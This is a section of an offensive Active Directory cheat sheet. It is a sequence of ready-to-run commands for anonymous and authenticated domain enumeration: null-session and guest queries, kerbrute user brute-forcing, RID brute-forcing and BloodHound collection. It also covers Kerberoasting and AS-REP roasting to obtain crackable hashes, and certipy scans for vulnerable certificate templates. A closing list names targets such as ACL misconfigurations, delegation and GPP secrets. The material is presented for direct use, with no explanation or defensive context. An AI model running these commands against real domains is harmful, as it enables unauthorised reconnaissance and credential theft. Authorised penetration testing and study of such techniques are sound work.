# 8. Active Directory Enumeration

## No credentials (anonymous/guest)

`# Null session enum
enum4linux-ng -A <dc-ip>
rpcclient -U "" -N <dc-ip>
  > enumdomusers
  > querydominfo
crackmapexec smb <dc-ip> -u '' -p '' --users
crackmapexec smb <dc-ip> -u 'guest' -p '' --shares

# Kerberos user enum (no creds)
kerbrute userenum -d domain.local --dc <dc-ip> users.txt

# RID brute
crackmapexec smb <dc-ip> -u guest -p '' --rid-brute 10000
lookupsid.py guest@<dc-ip>`

## With credentials

`crackmapexec smb <dc-ip> -u user -p pass --users --groups --shares --pass-pol --loggedon-users
ldapdomaindump -u 'domain\\user' -p pass <dc-ip>
bloodhound-python -d domain.local -u user -p pass -ns <dc-ip> -c All
GetUserSPNs.py domain.local/user:pass -dc-ip <dc-ip> -request
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <dc-ip> -no-pass
certipy find -u user@domain.local -p pass -dc-ip <dc-ip> -vulnerable -stdout`

## Key targets

- SPN users (Kerberoast)
- `DONT_REQ_PREAUTH` (AS-REP)
- Delegation (constrained/unconstrained)
- ACL misconfigs (GenericAll/WriteDACL)
- ADCS vulnerable templates (ESC1-8)
- SYSVOL/GPP secrets